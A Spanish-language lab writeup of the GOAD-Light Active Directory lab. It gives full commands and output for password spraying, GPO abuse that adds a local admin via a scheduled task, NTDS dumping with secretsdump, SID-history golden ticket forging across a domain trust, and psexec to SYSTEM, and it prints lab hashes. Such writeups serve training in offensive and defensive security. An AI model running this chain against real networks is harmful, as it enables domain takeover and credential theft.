---
title: "GOAD Light"
date: 2026-09-17 00:00:00 +0200
categories: [Writeups, GOAD]
tags: [active-directory, kerberos, password-spray, kerbrute, ldap-description-disclosure, bloodhound, gpo-abuse, golden-ticket, sid-history, cross-domain-trust, secretsdump, windows-server-2019, goad-light]
image:
  path: /assets/img/posts/goad-light-banner.png
  alt: GOAD Light
---

**Dificultad:** Media  
**Entorno:** Windows Server 2019 — [GOAD-Light](https://github.com/Orange-Cyberdefense/GOAD/tree/main/ad/GOAD-Light), la variante reducida de GOAD para equipos con pocos recursos: bosque de dos dominios (`sevenkingdoms.local` raíz, `north.sevenkingdoms.local` hijo), 3 máquinas en total  
**Objetivo:** Partiendo de cero contra el bosque, comprometer primero el dominio hijo, usar la relación de confianza para escalar hasta Domain Admin del dominio raíz, y rematar las tres máquinas del lab.

> Las credenciales y hashes reales están ocultos tras spoilers (🔓) — los comandos usan un placeholder genérico para que puedas intentarlo tú antes de revelar la respuesta.
{: .prompt-tip }

---

## Resumen

Este es **GOAD-Light**, la variante ligera de [GOAD](https://github.com/Orange-Cyberdefense/GOAD) pensada para hardware modesto: mismo universo temático de Juego de Tronos que el GOAD clásico (mismos nombres de host y de dominio), pero reducido a un único bosque de dos dominios y 3 máquinas — `sevenkingdoms.local` (raíz, DC `kingslanding`) y `north.sevenkingdoms.local` (hijo, DC `winterfell`, más un miembro `castelblack` con MSSQL). La documentación oficial es explícita sobre lo que se sacrifica frente al GOAD completo: sin bosque externo de confianza (nada de explotación cross-forest), sin *linked server* MSSQL de confianza, sin ESC2/ESC3/ESC4 de ADCS, y sin las vulnerabilidades clásicas de máquina antigua (Zerologon, PetitPotam sin autenticar...). Esto explica por qué el intento inicial contra `castelblack` vía MSSQL da vueltas en falso más adelante: aquí no hay ADCS ni *linked server* que abusar, así que el camino real hacia esa máquina no es SQL — es simplemente Domain Admin, que da admin local en cualquier equipo unido al dominio.

La cadena de ataque completa:

1. **Enumeración de usuarios** con `kerbrute` sobre ambos dominios usando un diccionario de nombres de personajes de la serie.
2. **Password spray** trivial (usuario = contraseña) → una credencial válida en el dominio hijo.
3. Con esa cuenta de bajísimo privilegio, **fuga de credenciales en el campo `description` de LDAP** → contraseña de `samwell.tarly` en texto plano, escrita ahí por error.
4. **BloodHound** revela que `samwell.tarly` puede convertirse en dueño de una GPO del dominio.
5. **Abuso de GPO** (toma de ownership + `GenericAll` + `pygpoabuse` sobre `ScheduledTasks.xml`) → admin local en `winterfell` (DC del dominio hijo).
6. `secretsdump` del DC hijo → hash de la cuenta de confianza `NORTH$`.
7. **Golden Ticket con SID History** (`ticketer.py` con `-extra-sid` apuntando a Enterprise Admins del dominio raíz) → salto de confianza padre-hijo.
8. `secretsdump` completo del NTDS del DC raíz (`kingslanding`) → **dominio raíz comprometido entero**.
9. Con el hash de `Administrator` del dominio hijo (Domain Admin, no `sql_svc`) → `psexec.py` contra `castelblack` → **SYSTEM confirmado en las tres máquinas del lab**.

---

## Infraestructura

| Host | IP | Rol | Dominio |
|------|-----|-----|---------|
| winterfell | 10.6.6.11 | Domain Controller | north.sevenkingdoms.local |
| castelblack | 10.6.6.22 | Miembro, MSSQL (`sql_svc`) | north.sevenkingdoms.local |
| kingslanding | 10.6.6.10 | Domain Controller | sevenkingdoms.local (raíz) |

---

## Fase 1: Reconocimiento y acceso inicial

Descubrimiento de hosts con NetExec:

```bash
nxc smb 10.6.6.0/24 --generate-hosts-file hosts_goad
```

```
SMB   10.6.6.11   445   WINTERFELL     (domain:north.sevenkingdoms.local)
SMB   10.6.6.22   445   CASTELBLACK    (domain:north.sevenkingdoms.local)
SMB   10.6.6.10   445   KINGSLANDING   (domain:sevenkingdoms.local)
```

El dominio raíz está bien cerrado a nivel de null session — `ldapsearch`, `rpcclient` y `smbclient` anónimos contra `kingslanding` devuelven `STATUS_ACCESS_DENIED` sin excepción. Toca ir por fuerza bruta de usuarios con un diccionario temático (nombres de la serie) contra los dos dominios:

```bash
kerbrute userenum -d sevenkingdoms.local --dc 10.6.6.10 got_users.txt
kerbrute userenum -d north.sevenkingdoms.local --dc 10.6.6.11 got_users.txt
```

El dominio raíz confirma 4 usuarios (`cersei.lannister`, `tywin.lannister`, `jaime.lannister`, `joffrey.baratheon`); el hijo confirma 11 (`arya.stark`, `eddard.stark`, `jon.snow`, `samwell.tarly`, `hodor`...). Los nombres de usuario no son secretos — son el resultado directo de esta enumeración, así que se muestran tal cual.

Un password spray trivial — cada usuario contra su propio nombre como contraseña — falla contra todos excepto uno:

```bash
nxc smb 10.6.6.11 -u north_users.txt -p north_users.txt --no-bruteforce --continue-on-success
```

<details markdown="1">
<summary>🔓 Ver credencial encontrada</summary>

```
[+] north.sevenkingdoms.local\hodor:hodor
```

</details>

La pista estaba en el propio nombre de usuario.

---

## Fase 2: La contraseña que estaba en el campo description

Con esa cuenta de dominio ya se puede leer `NETLOGON`/`SYSVOL` por SMB, y lanzar un módulo de NetExec que vuelca el atributo `description` de todos los usuarios vía LDAP:

```bash
nxc ldap 10.6.6.11 -u hodor -p '<contraseña>' -M get-desc-users
```

<details markdown="1">
<summary>🔓 Ver descripción filtrada</summary>

```
User: samwell.tarly   description: Samwell Tarly (Password : Heartsbane)
```

</details>

Ahí está — la contraseña de `samwell.tarly` escrita en texto plano en su propia descripción de AD. Confirmación:

```bash
nxc smb 10.6.6.11 -u samwell.tarly -p '<contraseña>'
```

<details markdown="1">
<summary>🔓 Ver resultado</summary>

```
[+] north.sevenkingdoms.local\samwell.tarly:Heartsbane
```

</details>

---

## Fase 3: BloodHound y abuso de GPO

```bash
bloodhound-python -u hodor -p '<contraseña>' -d north.sevenkingdoms.local -ns 10.6.6.11 -c All --zip
```

> **Nota:** `bloodhound-python` (legacy) rompe con un `TypeError` al parsear ciertos atributos de tipo `filetime` negativo (`minPwdAge`) en versiones recientes de `ldap3`. Se soluciona fijando la versión: `pip install ldap3==2.9.1 --break-system-packages --force-reinstall`.

El grafo muestra que `samwell.tarly` puede tomar posesión de una GPO llamada **`StarkWallpaper`** (`CN={C7F2AD8A-92E1-4507-A5B0-648A36E308A1},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local`), y desde ahí el camino sigue hasta comprometer el DC del dominio hijo y, cruzando la confianza de bosque, el DC raíz:

![Grafo de BloodHound mostrando la ruta samwell.tarly -> WriteOwner -> GPO StarkWallpaper -> WINTERFELL, y el SameForestTrust hacia sevenkingdoms.local](/assets/img/posts/goad-light-bloodhound.png)
_Grafo real de BloodHound: `samwell.tarly` con `WriteOwner` sobre la GPO `StarkWallpaper`, que aplica sobre `WINTERFELL` (`CoerceToTGT` hacia el dominio), y la relación `SameForestTrust` entre `north.sevenkingdoms.local` y `sevenkingdoms.local` que hace posible el salto de confianza._

Con [bloodyAD](https://github.com/CravateRouge/bloodyAD):

```bash
bloodyAD --host 10.6.6.11 -d north.sevenkingdoms.local -u samwell.tarly -p '<contraseña>' \
  set owner "CN={C7F2AD8A-92E1-4507-A5B0-648A36E308A1},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local" samwell.tarly

bloodyAD --host 10.6.6.11 -d north.sevenkingdoms.local -u samwell.tarly -p '<contraseña>' \
  add genericAll "CN={C7F2AD8A-92E1-4507-A5B0-648A36E308A1},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local" samwell.tarly
```

Con `GenericAll` sobre la GPO, [pygpoabuse](https://github.com/Hackndo/pygpoabuse) inyecta una tarea programada que añade al propio usuario al grupo de administradores locales allí donde se aplique la GPO. La GPO ya traía un `ScheduledTasks.xml` propio, así que hace falta `-f` para añadir la tarea sin pisar la existente:

```bash
pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:<contraseña>' \
  -gpo-id C7F2AD8A-92E1-4507-A5B0-648A36E308A1 \
  -command 'net localgroup administrators samwell.tarly /add' \
  -dc-ip 10.6.6.11 -f
```

```
[+] ScheduledTask TASK_b9824f45 created!
```

Tras el próximo ciclo de refresco de GPO (o forzándolo), `samwell.tarly` es admin local del DC:

```bash
nxc smb 10.6.6.11 -u samwell.tarly -p '<contraseña>'
# [+] ... (admin)
```

---

## Fase 4: Dump del DC hijo y ataque de confianza (SID History)

Con admin en `winterfell`, `secretsdump` completo saca la NTDS del dominio hijo — incluida la cuenta de confianza `NORTH$`:

```bash
secretsdump.py north.sevenkingdoms.local/samwell.tarly:'<contraseña>'@10.6.6.11
```

<details markdown="1">
<summary>🔓 Ver hashes volcados de winterfell</summary>

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
NORTH$:1105:aad3b435b51404eeaad3b435b51404ee:aaed1f8c12a6ff5b76a1903124b7363b:::
```

</details>

`NORTH$` es la cuenta de confianza que representa al dominio hijo dentro del bosque — y su NTLM es la clave para el ataque clásico de **SID History / confianza padre-hijo**. Con [ticketer.py](https://github.com/fortra/impacket) se forja un TGT para "Administrator" del dominio hijo, pero inyectando en el campo `SID History` el SID de **Enterprise Admins del dominio raíz** (`<SID-raíz>-519`):

```bash
ticketer.py -nthash '<hash de NORTH$>' \
  -domain-sid S-1-5-21-221956006-502909763-1067390246 \
  -domain north.sevenkingdoms.local \
  -extra-sid S-1-5-21-2080356956-2684343819-452018693-519 \
  Administrator
```

El dominio raíz no valida por sí solo que ese SID Enterprise Admins pertenezca realmente al historial de una cuenta legítima — confía en el propio dominio hijo (relación de confianza transitiva del bosque), así que el ticket forjado es aceptado como si el "Administrator" del hijo perteneciera también al grupo Enterprise Admins del bosque entero.

```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
```

Y ahí cae el dominio raíz completo:

<details markdown="1">
<summary>🔓 Ver NTDS completo de kingslanding</summary>

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5690a1ca2f11b3fce0f6e84e57c6da99:::
tywin.lannister:1113:...
jaime.lannister:1114:...
cersei.lannister:1115:...
tyron.lannister:1116:...
robert.baratheon:1117:...
...
```

</details>

Con el hash de `krbtgt` del dominio raíz en la mano, se puede forjar un Golden Ticket permanente para todo `sevenkingdoms.local`. Dominio raíz del bosque comprometido de principio a fin, partiendo de una cuenta cuya contraseña era literalmente su propio nombre.

---

## Fase 5: castelblack — el camino equivocado y el correcto

`castelblack` (10.6.6.22), el miembro del dominio hijo con MSSQL, se resiste al principio con varios intentos fallidos — todos por la misma razón de fondo: usar credenciales que no dan admin local.

- `mssqlclient.py` con el hash de `Administrator` **vía `-windows-auth`** → `Login failed. The login is from an untrusted domain` (autenticación integrada de Windows no negocia bien Kerberos ahí sin un ticket ya cargado).
- Con el ticket forjado por SID History sí autentica contra la instancia, pero el mensaje pasa a `Login failed for user 'NORTH\Administrator'` — llega hasta SQL Server, pero esa cuenta no tiene login SQL configurado.
- `wmiexec.py` / `psexec.py` con el hash de **`sql_svc`** → error de `SVCManager` (`Unable to open SVCManager`) y recurso compartido no escribible — `sql_svc` es sysadmin *dentro* de la instancia SQL, pero no es admin local de Windows, así que no puede abrir el Service Control Manager ni escribir en `ADMIN$`.

El problema nunca fue la máquina, era la cuenta. `Administrator` del dominio hijo (Domain Admin) sí es admin local en cualquier equipo unido al dominio — incluida `castelblack`. Con `-hashes` en vez de `-windows-auth`, y usando `psexec` en lugar de `mssqlclient`:

```bash
psexec.py NORTH/Administrator@10.6.6.22 -hashes aad3b435b51404eeaad3b435b51404ee:'<hash de Administrator>'
```

```
[*] Found writable share ADMIN$
[*] Creating service FZGn on 10.6.6.22.....
[*] Starting service FZGn.....

C:\Windows\system32> whoami
nt authority\system
```

Las tres máquinas del lab, completamente comprometidas:

| Máquina | Rol | Acceso final |
|---------|-----|--------------|
| `winterfell` | DC de `north.sevenkingdoms.local` (hijo) | Domain Admin + SYSTEM |
| `kingslanding` | DC de `sevenkingdoms.local` (raíz) | Domain Admin (vía SID History) |
| `castelblack` | Miembro, MSSQL | SYSTEM |

---

## Técnicas utilizadas

| Técnica | Descripción |
|---------|-------------|
| Username enumeration | `kerbrute userenum` con diccionario temático contra ambos dominios |
| Password spray | Usuario = contraseña, revela una credencial válida |
| LDAP description disclosure | Contraseña de `samwell.tarly` en texto plano en su propio atributo `description` |
| BloodHound (legacy) | Recolección LDAP para trazar la ruta de ataque |
| GPO abuse (ownership + GenericAll + ScheduledTask) | `bloodyAD` + `pygpoabuse` para conseguir admin local en el DC del dominio hijo |
| DCSync / NTDS dump | `secretsdump.py` contra el DC hijo, extracción de la cuenta de confianza `NORTH$` |
| SID History / Golden Ticket de confianza padre-hijo | `ticketer.py` con `-extra-sid` apuntando a Enterprise Admins del dominio raíz |
| NTDS dump del dominio raíz | Compromiso total del bosque tras el salto de confianza |
| Lateral movement con la cuenta correcta | `psexec.py` con el hash de Domain Admin (no el de la cuenta de servicio SQL) → SYSTEM en `castelblack` |

---

## Recursos

- [GOAD by Orange-Cyberdefense](https://github.com/Orange-Cyberdefense/GOAD)
- [GOAD-Light — documentación oficial](https://github.com/Orange-Cyberdefense/GOAD/tree/main/ad/GOAD-Light)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [pygpoabuse — Hackndo](https://github.com/Hackndo/pygpoabuse)
- [kerbrute — ropnop](https://github.com/ropnop/kerbrute)
- [SID History / child-parent trust attack — harmj0y](https://harmj0y.medium.com/from-kekeo-to-rubeus-33c6f7683aa7)
